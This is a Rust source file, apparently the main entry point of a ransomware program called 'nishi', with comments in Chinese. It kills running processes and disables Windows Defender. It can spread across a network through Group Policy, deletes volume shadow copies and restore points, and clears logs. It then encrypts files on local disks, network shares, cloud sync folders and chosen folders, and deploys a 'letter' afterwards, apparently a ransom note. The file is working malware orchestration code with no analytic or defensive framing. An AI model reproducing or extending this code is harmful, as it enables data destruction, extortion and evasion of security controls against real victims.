use std::env;
use std::error::Error;

use nishi::control::{CloudServiceController, SystemResourceManager};
#[cfg(windows)]
use nishi::system::defender_disabler;
use nishi::system::{run_full_disk_encryption, run_network_only_encryption, deploy_letter_after_encryption, LogCleaner, execute_process_killer};
use nishi::crypt::Config;
use nishi::{safe_gpo_deployment, safe_gpo_deployment_with_mode, ImplementationMode};
use nishi::system::task_manager::{get_global_task_manager, TaskType};

struct ResourceGuard {
    log_cleanup_enabled: bool,
}

impl ResourceGuard {
    fn new(log_cleanup_enabled: bool) -> Self {
        Self { log_cleanup_enabled }
    }
    
    fn cleanup(&self) {
        if self.log_cleanup_enabled {
            println!("[ResourceGuard] Cleaning logs...");
            let log_cleaner = LogCleaner::new();
            log_cleaner.clean_all_logs();
            println!("[ResourceGuard] Log cleanup completed.");
        }
        
        println!("[ResourceGuard] Waiting for background tasks to complete...");
        let task_manager = get_global_task_manager();
        task_manager.wait_for_all_tasks();
        println!("[ResourceGuard] All background tasks completed.");
    }
}

impl Drop for ResourceGuard {
    fn drop(&mut self) {
        self.cleanup();
    }
}

#[cfg(windows)]
fn get_desktop_path() -> String {
    use windows::Win32::UI::Shell::SHGetFolderPathW;
    
    let mut path = [0u16; 260];
    unsafe {
        let result = SHGetFolderPathW(None, 0x0000, None, 0, &mut path);
        if result.is_ok() {
            let len = path.iter().position(|&c| c == 0).unwrap_or(path.len());
            String::from_utf16_lossy(&path[..len])
        } else {
            let user_profile = env::var("USERPROFILE").unwrap_or_default();
            format!("{}\\Desktop", user_profile)
        }
    }
}

#[cfg(not(windows))]
fn get_desktop_path() -> String {
    let home = env::var("HOME").unwrap_or_default();
    format!("{}/Desktop", home)
}

fn main() {
    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        main_impl()
    }));

    match result {
        Ok(inner_result) => {
            if let Err(e) = inner_result {
                eprintln!("[FATAL] Program failed with error: {}", e);
                std::process::exit(1);
            }
        }
        Err(_) => {
            eprintln!("[FATAL] Program panicked! Attempting graceful shutdown...");
            let task_manager = get_global_task_manager();
            task_manager.request_shutdown();
            std::thread::sleep(std::time::Duration::from_millis(500));
            std::process::exit(1);
        }
    }
}

fn main_impl() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    
    println!("DEBUG: Starting to load config from binary...");
    let config = Config::load_from_binary()?;
    
    println!("DEBUG: Config loaded from binary");
    println!("DEBUG: target_identifier = {:?}", config.target_identifier);
    println!("DEBUG: encrypt_ratio = {}", config.encrypt_ratio);
    println!("DEBUG: priority_folders = {:?}", config.priority_folders);
    println!("DEBUG: full_mode = {}", config.full_mode);
    println!("DEBUG: use_blacklist_mode = {}", config.use_blacklist_mode);
    println!("DEBUG: exclude_extensions = {:?}", config.exclude_extensions);

    let mut nokill_mode = false;
    let mut full_mode = config.full_mode;
    let mut network_only_mode = config.default_network_only;
    let mut desktop_only_mode = false;
    let mut path_mode = false;
    let mut delete_shadows_mode = false;
    let mut gpospread_mode = false;
    let mut gpo_implementation_mode = ImplementationMode::WindowsAPI;
    let mut target_path: Option<String> = None;
    let mut max_runtime_minutes: Option<u64> = None;

    // 首先解析参数，确定运行模式
    for (i, arg) in args.iter().enumerate() {
        match arg.as_str() {
            "--full" => full_mode = true,
            "--partial" => full_mode = false,
            "--network-only" => network_only_mode = true,
            "--desktop-only" => desktop_only_mode = true,
            "--path" => {
                path_mode = true;
                if i + 1 < args.len() {
                    target_path = Some(args[i + 1].clone());
                }
            }
            "--delete-shadows" => delete_shadows_mode = true,
            "--gpospread" => gpospread_mode = true,
            "--gpo-api" => gpo_implementation_mode = ImplementationMode::WindowsAPI,
            "--gpo-powershell" => gpo_implementation_mode = ImplementationMode::PowerShell,
            "--nokill" => nokill_mode = true,
            "--max-runtime" => {
                if i + 1 < args.len() {
                    match args[i + 1].parse::<u64>() {
                        Ok(minutes) => max_runtime_minutes = Some(minutes),
                        Err(_) => {
                            eprintln!("Invalid max-runtime value: {}", args[i + 1]);
                            return Err("Invalid max-runtime value".into());
                        }
                    }
                }
            }
            _ => {}
        }
    }
    
    // 创建资源守卫，确保在任何情况下都能清理资源
    let _resource_guard = ResourceGuard::new(config.enable_log_cleanup);

    if !nokill_mode {
        println!("Terminating target processes...");
        execute_process_killer();
        println!("Process termination completed.");
    } else {
        println!("NOKILL mode: Skipping process termination.");
    }

    // 在进程终止之后动态调整性能参数，以获取更准确的可用内存
    println!("Tuning performance parameters based on available system resources...");
    let mut config = config;
    config.auto_tune_performance();
    println!("Performance tuning completed.");

    // 在所有模式下都首先尝试禁用Windows Defender
    #[cfg(windows)]
    {
        println!("Disabling Windows Defender...");
        match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            defender_disabler::execute_ultra_fast();
        })) {
            Ok(_) => println!("Windows Defender disabling completed."),
            Err(_) => {
                eprintln!("[WARNING] Defender disabler panicked, continuing...");
            }
        }
    }

    // 如果启用了 gpospread 模式，使用任务管理器来运行 GPO 部署
    if gpospread_mode {
        println!("Starting GPO spread in isolated thread...");
        println!("GPO Implementation Mode: {:?}", gpo_implementation_mode);
        
        let task_manager = get_global_task_manager();
        let gpo_implementation_mode_clone = gpo_implementation_mode;
        
        // 使用任务管理器启动 GPO 部署任务
        let gpo_task_id = task_manager.spawn_task(TaskType::GpoDeployment, "GPO Deployment", move || {
            println!("[GPO Thread] GPO spread thread started - completely isolated from encryption operations");
            
            // 添加 panic 捕获
            match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                // 使用指定的实现模式调用 GPO 部署函数
                safe_gpo_deployment_with_mode(gpo_implementation_mode_clone)
            })) {
                Ok(result) => {
                    match result {
                        Ok(_) => {
                            println!("[GPO Thread] GPO deployment completed successfully");
                        }
                        Err(e) => {
                            eprintln!("[GPO Thread] GPO deployment failed: {}", e);
                        }
                    }
                }
                Err(_) => {
                    eprintln!("[GPO Thread] GPO deployment panicked, continuing...");
                }
            }
        });
        
        // 等待 GPO 任务完成
        println!("Waiting for GPO deployment task to complete...");
        if let Err(e) = task_manager.wait_for_task(gpo_task_id) {
            eprintln!("GPO deployment task failed: {}", e);
        } else {
            println!("GPO spread task completed");
        }
        
        println!("GPO spread mode completed. Continuing with encryption...");
    }

    // 显示当前加密模式
    if full_mode {
        println!("当前模式: FULL 模式 (加密除黑名单外的所有文件)");
    } else {
        println!("当前模式: PARTIAL 模式 (只加密指定扩展名的文件)");
    }
    
    // 显示加密比例
    println!("加密比例: {}%", config.encrypt_ratio);
    
    // 显示优先文件夹
    if !config.priority_folders.is_empty() {
        println!("优先加密文件夹:");
        for folder in &config.priority_folders {
            println!("  - {}", folder);
        }
    }

    // 检查是否提供了"--network-only"参数来跳过本地加密
    if network_only_mode {
        // 首先运行系统资源管理器
        let system_manager = SystemResourceManager::new();
        system_manager.start_single_execution();

        // 然后运行云服务控制器，确保云同步服务正常运行
        let cloud_controller = CloudServiceController::new();
        cloud_controller.ensure_all_cloud_services_running();

        println!("Nishi Network-Only Mode Starting...");

        // 使用硬编码配置进行网络加密
        let mut config = Config::new_with_extensions(Config::default().extensions);
        config.enable_async_io = true;
        config.enable_full_disk_encryption = false; // 网络专用模式下禁用本地加密
        config.enable_auto_traverse = false;        // 网络专用模式下禁用自动遍历

        // 运行网络专用加密过程，添加 panic 捕获
        let encryption_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            run_network_only_encryption(config)
        }));
        
        match encryption_result {
            Ok(result) => {
                match result {
                    Ok(_) => {
                        println!("Network-only encryption completed successfully.");
                        if let Err(e) = deploy_letter_after_encryption() {
                            eprintln!("Warning: Failed to deploy letter: {}", e);
                        }
                    }
                    Err(e) => {
                        eprintln!("Network-only encryption failed: {}", e);
                        eprintln!("Continuing with cleanup...");
                    }
                }
            }
            Err(_) => {
                eprintln!("[FATAL] Network-only encryption panicked!");
            }
        }
    } else if path_mode || config.only_encrypt_path.is_some() {
        // 指定路径加密模式
        let target_path = if config.only_encrypt_path.is_some() {
            config.only_encrypt_path.clone()
        } else if target_path.is_some() {
            target_path
        } else {
            eprintln!("Usage: {} --path <directory>", args[0]);
            return Err("Missing path argument".into());
        };
        
        println!("Nishi Path-Specific Encryption Starting...");
        let target_path = target_path.unwrap();
        println!("Target directory: {}", target_path);
        
        let mut config = Config::new_with_extensions(if full_mode {
            vec![]
        } else {
            vec![
                "doc".into(), "docx".into(), "xlsx".into(), "xls".into(), 
                "pptx".into(), "ppt".into(), "pdf".into(),
                "txt".into(), "jpg".into(), "png".into(),
                "mp3".into(), "wav".into(), "flac".into(), "aac".into(),
                "mp4".into(), "avi".into(), "mkv".into(), "mov".into(),
                "wmv".into(), "flv".into(), "webm".into(),
            ]
        });
        config.enable_async_io = true;
        config.enable_full_disk_encryption = true;
        config.enable_auto_traverse = true;
        config.only_encrypt_path = Some(target_path.to_string());
        config.full_mode = full_mode;
        
        let max_runtime_seconds = max_runtime_minutes.map(|m| m * 60);
        
        // 运行加密过程，添加 panic 捕获
        let encryption_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            run_full_disk_encryption(config, max_runtime_seconds)
        }));
        
        match encryption_result {
            Ok(result) => {
                match result {
                    Ok(_) => {
                        println!("Path encryption completed successfully.");
                        if let Err(e) = deploy_letter_after_encryption() {
                            eprintln!("Warning: Failed to deploy letter: {}", e);
                        }
                    }
                    Err(e) => {
                        eprintln!("Path encryption failed: {}", e);
                        eprintln!("Continuing with cleanup...");
                    }
                }
            }
            Err(_) => {
                eprintln!("[FATAL] Path encryption panicked!");
            }
        }
    } else if delete_shadows_mode {
        // 删除卷影副本模式
        #[cfg(windows)]
        {
            println!("Deleting all volume shadow copies...");
            match std::panic::catch_unwind(|| {
                nishi::system::vss_remover::force_delete_all_shadows_sync()
            }) {
                Ok(result) => {
                    if let Err(e) = result {
                        eprintln!("Warning: Failed to delete shadow copies: {}", e);
                    }
                }
                Err(_) => {
                    eprintln!("Warning: Shadow deletion panicked, continuing...");
                }
            }
            println!("Volume shadow copy deletion completed.");
        }
        #[cfg(not(windows))]
        {
            println!("Volume shadow copy deletion is only supported on Windows.");
        }
    } else {
        // 首先运行系统资源管理器
        let system_manager = SystemResourceManager::new();
        system_manager.start_single_execution();

        // 然后运行云服务控制器，确保云同步服务正常运行
        let cloud_controller = CloudServiceController::new();
        cloud_controller.ensure_all_cloud_services_running();

        // 获取云同步路径（可选：用于后续处理）
        let cloud_paths = cloud_controller.get_cloud_sync_paths();
        if !cloud_paths.is_empty() {
            println!("[主程序] 检测到以下云同步目录:");
            for path in &cloud_paths {
                println!("  - {}", path);
            }
        } else {
            println!("[主程序] 未检测到云同步目录");
        }

        // 删除所有卷影副本
        #[cfg(windows)]
        {
            println!("Deleting all volume shadows and restore points...");
            println!("DEBUG: Starting shadow deletion...");
            match std::panic::catch_unwind(|| {
                nishi::system::vss_remover::force_delete_all_shadows_sync()
            }) {
                Ok(result) => {
                    if let Err(e) = result {
                        println!("DEBUG: Shadow deletion failed: {}", e);
                        eprintln!("Warning: Failed to cleanup shadow copies: {}", e);
                    } else {
                        println!("DEBUG: Shadow deletion completed successfully");
                    }
                }
                Err(_) => {
                    println!("DEBUG: Shadow deletion panicked, continuing...");
                    eprintln!("Warning: Shadow deletion panicked, continuing...");
                }
            }
            println!("Shadow copy cleanup completed successfully");
        }

        println!("Nishi Full Disk Encryption Starting...");

        // 使用从二进制文件中读取的配置进行全盘加密
        let mut config = config;
        config.enable_async_io = true;
        config.enable_full_disk_encryption = true;
        config.enable_auto_traverse = true;
        config.full_mode = full_mode;
        config.header_percentage = config.encrypt_ratio;
        
        // 设置优先文件夹
        if !config.priority_folders.is_empty() {
            config.priority_path = Some(config.priority_folders.join(";"));
        }
        
        let max_runtime_seconds = max_runtime_minutes.map(|m| m * 60);

        // 运行加密过程，添加 panic 捕获
        let encryption_result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            run_full_disk_encryption(config, max_runtime_seconds)
        }));
        
        match encryption_result {
            Ok(result) => {
                match result {
                    Ok(_) => {
                        println!("Full disk encryption completed successfully.");
                        if let Err(e) = deploy_letter_after_encryption() {
                            eprintln!("Warning: Failed to deploy letter: {}", e);
                        }
                    }
                    Err(e) => {
                        eprintln!("Full disk encryption failed: {}", e);
                        eprintln!("Continuing with cleanup...");
                    }
                }
            }
            Err(_) => {
                eprintln!("[FATAL] Full disk encryption panicked!");
            }
        }
    }

    Ok(())
}
